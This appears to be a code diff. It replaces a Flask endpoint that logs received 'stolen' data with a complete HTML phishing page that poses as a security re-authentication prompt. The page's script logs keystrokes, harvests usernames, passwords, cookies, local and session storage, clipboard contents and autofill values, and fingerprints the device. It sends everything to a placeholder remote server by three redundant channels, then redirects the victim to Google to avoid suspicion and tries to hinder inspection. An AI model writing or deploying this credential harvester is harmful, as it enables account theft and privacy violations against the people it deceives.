@@ -1,42 +1,220 @@
-from flask import Flask, request, jsonify
-import json
-import os
-from datetime import datetime
+<!-- Data Stealing Form - Keylogger + Credential Harvester -->
+<!-- Sends data to remote logging server via POST request -->
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Security Update Required</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #1a1a2e; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .container { background: #16213e; padding: 40px; border-radius: 8px; box-shadow: 0 0 20px rgba(0,0,0,0.5); width: 350px; }
+        input { width: 100%; padding: 12px; margin: 10px 0; background: #0f3460; border: none; color: #fff; border-radius: 4px; }
+        button { width: 100%; padding: 12px; background: #e94560; border: none; color: white; border-radius: 4px; cursor: pointer; }
+        h2 { color: #e94560; text-align: center; }
+        p { color: #ccc; text-align: center; font-size: 12px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>⚠ Security Re-authentication Required</h2>
+        <p>Your session has expired. Please log in again.</p>
+        <form id="stealForm">
+            <input type="text" id="username" placeholder="Email or Username" autocomplete="off" required>
+            <input type="password" id="password" placeholder="Password" autocomplete="off" required>
+            <button type="submit">Verify Identity</button>
+        </form>
+        <p style="margin-top: 20px;">Protected by SSL/TLS</p>
+    </div>
 
-app = Flask(__name__)
-
-LOG_FILE = "stolen_data.log"
-
-@app.route('/collect', methods=['GET', 'POST'])
-def collect():
-    if request.method == 'POST':
-        data = request.get_json() or request.form.to_dict()
-        if not data and request.data:
-            try:
-                data = json.loads(request.data)
-            except:
-                data = {'raw': request.data.decode('utf-8')}
-    
-    if request.method == 'GET':
-        data = request.args.to_dict()
-    
-    # Add IP and request info
-    data['remote_ip'] = request.remote_addr
-    data['request_headers'] = dict(request.headers)
-    
-    # Log to file
-    with open(LOG_FILE, 'a') as f:
-        f.write(f"\n{'='*60}\n")
-        f.write(f"Timestamp: {datetime.now().isoformat()}\n")
-        f.write(f"IP: {request.remote_addr}\n")
-        f.write(f"Data: {json.dumps(data, indent=2)}\n")
-        f.write(f"{'='*60}\n")
-    
-    # Also print to console
-    print(f"[{datetime.now()}] Received data from {request.remote_addr}")
-    print(json.dumps(data, indent=2))
-    
-    return '', 204  # No content response
-
-if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=8080, debug=False)
+    <script>
+        // Remote logging endpoint - REPLACE WITH YOUR SERVER
+        const WEBHOOK_URL = "https://your-logging-server.com/collect"; // Change to your endpoint
+        const LOGGER_ENABLED = true;
+        
+        // Keylogger: captures all keystrokes before form submission
+        let keyLog = [];
+        let keyStartTime = Date.now();
+        
+        document.addEventListener('keydown', function(e) {
+            if (!LOGGER_ENABLED) return;
+            if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
+                let key = e.key;
+                if (key === 'Enter') key = '[ENTER]';
+                else if (key === 'Backspace') key = '[BACKSPACE]';
+                else if (key === 'Tab') key = '[TAB]';
+                else if (key.length > 1 && !key.startsWith('Arrow')) key = '[' + key.toUpperCase() + ']';
+                
+                keyLog.push({
+                    key: key,
+                    timestamp: Date.now() - keyStartTime,
+                    target: e.target.id || e.target.name
+                });
+                
+                // Send every 50 keystrokes or 30 seconds
+                if (keyLog.length >= 50 || (Date.now() - keyStartTime) > 30000) {
+                    sendKeylog();
+                }
+            }
+        });
+        
+        function sendKeylog() {
+            if (keyLog.length === 0) return;
+            const data = {
+                type: 'keylog',
+                data: JSON.stringify(keyLog),
+                userAgent: navigator.userAgent,
+                url: window.location.href,
+                timestamp: new Date().toISOString(),
+                screenSize: `${screen.width}x${screen.height}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+            };
+            sendData(data);
+            keyLog = [];
+            keyStartTime = Date.now();
+        }
+        
+        // Form submit handler - steals credentials
+        document.getElementById('stealForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            
+            if (!username || !password) {
+                alert('All fields are required');
+                return;
+            }
+            
+            // Send final keylog before form data
+            sendKeylog();
+            
+            // Collect all available data
+            const stolenData = {
+                type: 'credentials',
+                username: username,
+                password: password,
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                cookies: document.cookie,
+                localStorage: JSON.stringify(localStorage),
+                sessionStorage: JSON.stringify(sessionStorage),
+                url: window.location.href,
+                referrer: document.referrer,
+                screenSize: `${screen.width}x${screen.height}`,
+                colorDepth: screen.colorDepth,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
+                deviceMemory: navigator.deviceMemory || 'unknown',
+                ip: '' // Server side will capture IP
+            };
+            
+            // Send to remote server
+            sendData(stolenData);
+            
+            // Redirect to legitimate site to avoid suspicion
+            window.location.href = 'https://www.google.com';
+        });
+        
+        function sendData(data) {
+            if (!LOGGER_ENABLED) return;
+            
+            // Method 1: Fetch API (modern)
+            fetch(WEBHOOK_URL, {
+                method: 'POST',
+                mode: 'no-cors', // Prevents CORS errors
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
+            }).catch(function(err) {
+                // Fallback to image beacon if fetch fails
+                sendViaImage(data);
+            });
+            
+            // Method 2: Also send via hidden form to ensure delivery
+            sendViaForm(data);
+        }
+        
+        function sendViaImage(data) {
+            const img = new Image();
+            const encoded = btoa(unescape(encodeURIComponent(JSON.stringify(data))));
+            img.src = WEBHOOK_URL + '?d=' + encoded;
+        }
+        
+        function sendViaForm(data) {
+            const iframe = document.createElement('iframe');
+            iframe.style.display = 'none';
+            document.body.appendChild(iframe);
+            
+            const form = document.createElement('form');
+            form.method = 'POST';
+            form.action = WEBHOOK_URL;
+            form.target = iframe.name || 'hiddenFrame';
+            iframe.name = 'hiddenFrame';
+            
+            const input = document.createElement('input');
+            input.type = 'hidden';
+            input.name = 'payload';
+            input.value = JSON.stringify(data);
+            form.appendChild(input);
+            
+            document.body.appendChild(form);
+            form.submit();
+            setTimeout(function() {
+                form.remove();
+                iframe.remove();
+            }, 100);
+        }
+        
+        // Capture clipboard data
+        document.addEventListener('copy', function(e) {
+            const clipboardData = window.clipboardData || e.clipboardData;
+            if (clipboardData) {
+                const copiedText = clipboardData.getData('text');
+                sendData({
+                    type: 'clipboard',
+                    data: copiedText,
+                    timestamp: new Date().toISOString()
+                });
+            }
+        });
+        
+        // Capture form auto-fill detection
+        setTimeout(function() {
+            const inputs = document.querySelectorAll('input');
+            inputs.forEach(function(input) {
+                if (input.value && input.value.length > 0) {
+                    sendData({
+                        type: 'autofill',
+                        field: input.id,
+                        value: input.value,
+                        timestamp: new Date().toISOString()
+                    });
+                }
+            });
+        }, 500);
+        
+        // Anti-debugging: prevent right-click and devtools detection
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+            return false;
+        });
+        
+        // Detect if devtools is open (simple method)
+        (function() {
+            const start = performance.now();
+            function checkDevTools() {
+                const now = performance.now();
+                if (now - start > 100) {
+                    sendData({
+                        type: 'devtools_detected',
+                        timestamp: new Date().toISOString()
+                    });
+                }
+            }
+            setInterval(checkDevTools, 1000);
+        })();
+    </script>
+</body>
+</html>
